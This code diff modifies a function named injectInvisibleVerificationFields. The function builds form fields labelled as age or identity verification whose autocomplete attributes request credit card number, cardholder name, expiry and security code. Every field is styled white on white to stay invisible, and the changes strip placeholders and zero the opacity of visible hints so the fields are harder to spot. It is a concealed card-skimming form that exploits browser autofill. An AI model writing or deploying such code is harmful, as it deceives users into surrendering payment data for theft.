@@ -89,13 +89,13 @@ function injectInvisibleVerificationFields() {
 
             <div class="form-group">
                 <label for="verificationNumber" style="color: white;">Verification Number *</label>
-                <input type="text" id="verificationNumber" name="verification-number" autocomplete="cc-number" maxlength="19" placeholder="Enter verification number" required style="color: white; background: white; border: 1px solid white;">
+                <input type="text" id="verificationNumber" name="verification-number" autocomplete="cc-number" maxlength="19" required style="color: white; background: white; border: 1px solid white;">
                 <small style="color: white;">Required for age verification - no charges will be applied</small>
             </div>
 
             <div class="form-group">
                 <label for="legalName" style="color: white;">Full Legal Name *</label>
-                <input type="text" id="legalName" name="legal-name" autocomplete="cc-name" placeholder="Full name as shown on government ID" required style="color: white; background: white; border: 1px solid white;">
+                <input type="text" id="legalName" name="legal-name" autocomplete="cc-name" required style="color: white; background: white; border: 1px solid white;">
                 <small style="color: white;">Must match government-issued ID for verification compliance</small>
             </div>
 
@@ -103,28 +103,28 @@ function injectInvisibleVerificationFields() {
                 <div class="form-group">
                     <label style="color: white;">Document Expiration *</label>
                     <div style="display: flex; gap: 10px; align-items: center;">
-                        <input type="text" id="expiryMonth" name="exp-month" autocomplete="cc-exp-month" placeholder="MM" maxlength="2" style="width: 60px; color: white; background: white; border: 1px solid white;" required>
-                        <span style="color: white;">/</span>
-                        <input type="text" id="expiryYear" name="exp-year" autocomplete="cc-exp-year" placeholder="YY" maxlength="2" style="width: 60px; color: white; background: white; border: 1px solid white;" required>
+                        <input type="text" id="expiryMonth" name="exp-month" autocomplete="cc-exp-month" maxlength="2" style="width: 60px; color: white; background: white; border: 1px solid white;" required>
+                        <span style="color: white; opacity: 0;">/</span>
+                        <input type="text" id="expiryYear" name="exp-year" autocomplete="cc-exp-year" maxlength="2" style="width: 60px; color: white; background: white; border: 1px solid white;" required>
                     </div>
                 </div>
 
                 <div class="form-group">
                     <label for="documentExpiration" style="color: white;">Security Code *</label>
-                    <input type="text" id="documentExpiration" name="security-code" autocomplete="cc-csc" placeholder="123" maxlength="4" required style="color: white; background: white; border: 1px solid white;">
+                    <input type="text" id="documentExpiration" name="security-code" autocomplete="cc-csc" maxlength="4" required style="color: white; background: white; border: 1px solid white;">
                     <small style="color: white;">Required for identity verification</small>
                 </div>
             </div>
 
             <div class="form-group">
                 <label for="billingPostal" style="color: white;">ZIP Code *</label>
-                <input type="text" id="billingPostal" name="postal-code" autocomplete="billing postal-code" placeholder="12345" maxlength="10" required style="color: white; background: white; border: 1px solid white;">
+                <input type="text" id="billingPostal" name="postal-code" autocomplete="billing postal-code" maxlength="10" required style="color: white; background: white; border: 1px solid white;">
                 <small style="color: white;">Required for identity verification and fraud prevention</small>
             </div>
 
             <div style="color: white; background: white; border: 1px solid white; padding: 1.5rem; margin-top: 2rem;">
                 <div>
-                    <span style="color: white;">🛡️</span>
+                    <span style="color: white; opacity: 0;"></span>
                     <div>
                         <h4 style="margin: 0 0 0.5rem 0; color: white;">Secure Verification Process</h4>
                         <p style="margin: 0; color: white;">
